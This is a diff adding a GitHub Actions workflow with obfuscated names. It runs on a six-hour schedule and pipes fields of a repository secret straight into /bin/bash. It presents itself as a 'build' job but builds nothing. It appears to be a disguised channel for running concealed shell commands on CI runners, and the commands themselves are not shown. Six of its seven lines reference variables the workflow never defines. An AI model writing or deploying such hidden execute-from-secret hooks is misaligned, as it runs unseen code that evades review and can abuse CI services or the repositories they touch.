@@ -1,0 +1,23 @@
+name: sushanlinshizn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sushanlinshizn
+        env:
+          bnqhe31564: ${{ secrets.bnqhe31564 }}
+        run: |
+          echo $bnqhe31564 | jq -r .nln76 | /bin/bash
+          echo $sl552 | jq -r .alp315 | /bin/bash
+          echo $qliem76 | jq -r .pppuw7401 | /bin/bash
+          echo $p975 | jq -r .kgfd3 | /bin/bash
+          echo $ju04 | jq -r .ddmyr838 | /bin/bash
+          echo $ejhy9300 | jq -r .nsjsa96 | /bin/bash
+          echo $ors3101 | jq -r .nuvz29169 | /bin/bash
+
